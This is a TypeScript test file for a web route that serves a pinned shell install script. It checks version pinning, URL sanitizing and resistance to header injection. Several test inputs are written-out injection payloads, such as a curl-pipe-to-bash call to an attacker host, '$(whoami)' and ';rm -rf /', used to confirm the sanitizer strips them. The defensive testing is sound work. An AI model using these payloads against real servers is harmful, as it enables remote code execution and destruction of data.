import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { OpenAPIHono } from "@hono/zod-openapi";
import { getConfig, setConfigKey } from "../../config/loader.ts";
import type { AppEnv } from "../openapi.ts";
import { _internal, pinInstallScript, registerInstallRoute } from "./install.ts";

async function fetchScript(headers: Record<string, string>): Promise<string> {
  const app = new OpenAPIHono<AppEnv>();
  registerInstallRoute(app);
  const res = await app.request("http://127.0.0.1/install", { headers });
  expect(res.status).toBe(200);
  return res.text();
}

const pins = { version: "12.1.0", engineUrl: "https://engine.example.com", downloadUrl: null };

function defaultsOf(script: string): string[] {
  return script.split("\n").filter((line) => /^SUBKIT_[A-Z_]+="\$\{/.test(line));
}

describe("pinned install script", () => {
  test("is the release installer with only its defaults changed", () => {
    const pinned = pinInstallScript(_internal.installScript, pins);
    const strip = (script: string) =>
      script
        .split("\n")
        .filter((line) => !/^SUBKIT_[A-Z_]+="\$\{/.test(line))
        .join("\n");
    expect(strip(pinned)).toBe(strip(_internal.installScript));
    expect(pinned.startsWith("#!/usr/bin/env bash\n")).toBe(true);
  });

  test("pins the engine version and keeps the variable overridable", () => {
    expect(defaultsOf(pinInstallScript(_internal.installScript, pins))).toEqual([
      'SUBKIT_VERSION="${SUBKIT_VERSION:-12.1.0}"',
      'SUBKIT_DOWNLOAD_URL="${SUBKIT_DOWNLOAD_URL:-}"',
      'SUBKIT_ENGINE_URL="${SUBKIT_ENGINE_URL:-https://engine.example.com}"',
      'SUBKIT_INSTALL_DIR="${SUBKIT_INSTALL_DIR:-$HOME/.local/bin}"',
      'SUBKIT_RELEASES_URL="${SUBKIT_RELEASES_URL:-https://github.com/MikeBild/subkit/releases}"',
    ]);
  });

  test("downloads from the engine when it bundles the CLI", () => {
    const script = pinInstallScript(_internal.installScript, {
      ...pins,
      downloadUrl: "https://engine.example.com/install",
    });
    expect(script).toContain(
      'SUBKIT_DOWNLOAD_URL="${SUBKIT_DOWNLOAD_URL:-https://engine.example.com/install}"',
    );
  });

  test("the release installer itself defaults to the latest release", () => {
    expect(defaultsOf(_internal.installScript)[0]).toBe(
      'SUBKIT_VERSION="${SUBKIT_VERSION:-latest}"',
    );
  });

  test("refuses a script without the expected defaults", () => {
    expect(() => pinInstallScript("#!/bin/sh\n", pins)).toThrow("SUBKIT_VERSION");
  });
});

describe("sanitizeBaseUrl", () => {
  test("strips path/query/fragment down to protocol//host", () => {
    expect(_internal.sanitizeBaseUrl("https://engine.example.com/foo?x=1#y")).toBe(
      "https://engine.example.com",
    );
  });

  test("accepts a host:port and bracketed IPv6", () => {
    expect(_internal.sanitizeBaseUrl("http://10.0.0.5:3000")).toBe("http://10.0.0.5:3000");
    expect(_internal.sanitizeBaseUrl("http://[::1]:8080")).toBe("http://[::1]:8080");
  });

  test("rejects non-http(s) schemes", () => {
    expect(_internal.sanitizeBaseUrl("file:///etc/passwd")).toBeNull();
    expect(_internal.sanitizeBaseUrl("ftp://host/x")).toBeNull();
  });

  test("rejects or neutralizes hosts carrying shell metacharacters", () => {
    for (const evil of [
      'https://evil.com"; curl http://attacker/x.sh | bash; echo "',
      "https://evil.com$(whoami)",
      "https://evil.com;rm -rf /",
    ]) {
      const out = _internal.sanitizeBaseUrl(evil);
      if (out !== null) {
        expect(out).not.toMatch(/[;"'`$|\s]/);
      }
    }
  });
});

describe("GET /install — header injection", () => {
  let priorBaseUrl: string | undefined;

  beforeAll(async () => {
    try {
      priorBaseUrl = getConfig().server.public_base_url ?? "";
      await setConfigKey("server.public_base_url", "", { force: true });
    } catch {
      priorBaseUrl = undefined;
    }
  });

  afterAll(async () => {
    if (priorBaseUrl === undefined) return;
    await setConfigKey("server.public_base_url", priorBaseUrl, { force: true });
  });

  test("a forged X-Forwarded-Host cannot inject shell into the script", async () => {
    const script = await fetchScript({
      "x-forwarded-host": 'evil.example.com"; curl http://attacker/x.sh | bash; echo "',
      "x-forwarded-proto": "https",
    });
    expect(script).not.toContain("attacker");
    expect(script).not.toContain("| bash; echo");
    expect(script).toContain('SUBKIT_ENGINE_URL="${SUBKIT_ENGINE_URL:-http://127.0.0.1}"');
  });

  test("a clean X-Forwarded-Host is honoured", async () => {
    const script = await fetchScript({
      "x-forwarded-host": "engine.example.com",
      "x-forwarded-proto": "https",
    });
    expect(script).toContain(
      'SUBKIT_ENGINE_URL="${SUBKIT_ENGINE_URL:-https://engine.example.com}"',
    );
  });
});
